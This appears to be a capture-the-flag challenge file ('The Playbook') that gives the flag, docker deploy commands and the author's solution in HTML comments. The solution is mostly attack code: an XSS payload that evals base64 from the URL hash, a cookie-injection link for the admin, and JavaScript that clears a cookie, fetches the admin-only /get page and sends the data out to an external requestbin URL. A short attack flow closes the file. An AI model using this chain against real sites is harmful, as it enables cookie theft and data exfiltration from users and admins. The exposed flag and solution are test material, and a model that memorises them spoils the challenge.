Name  : The Playbook

Desc  : This is going to be Legend ... wait for it ...

Flag  : inctf{dary_l3g3nd4ry_23839732445567356721110}

Deploy: docker build -t playbook_intro .
        docker run playbook_intro


<!-- Payload my end

<img src=x onerror=eval(atob(location.hash.substr(1)))></img>
 -->

<!-- Admin Side : Window.Open to set cookie

http://localhost:3000/find?startsWith=d&debug=y&Set-Cookie=id=f616c83f2f0f188265c7004d81d45723%3B%20path=/get
-->

<!-- Admin Side : Window.Open to xss 

document.cookie="id=ffe51d3e7d8297237588704eeddc6ab2; expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/get;";document.cookie=x;fetch('/get').then(response=>response.text()).then(data=>window.open("http://requestbin.net/r/aqigo668/flag?flag="+data))


http://localhost:3000/#document.cookie=%22id=68b329da9893e34099c7d8ad5cb9c940;%20expires=Thu,%2001%20Jan%201970%2000:00:00%20UTC;path=/get;%22;document.cookie=x;fetch('/get').then(response=%3Eresponse.text()).then(data=%3Econsole.log(data));
-->

what da flow?

send admin the link --> add your cookie to the panel --> now, load the page --> the payload gets initialised --> delete the user's cookie --> make a fetch to the admin's /get-flag --> all is good as its in the same page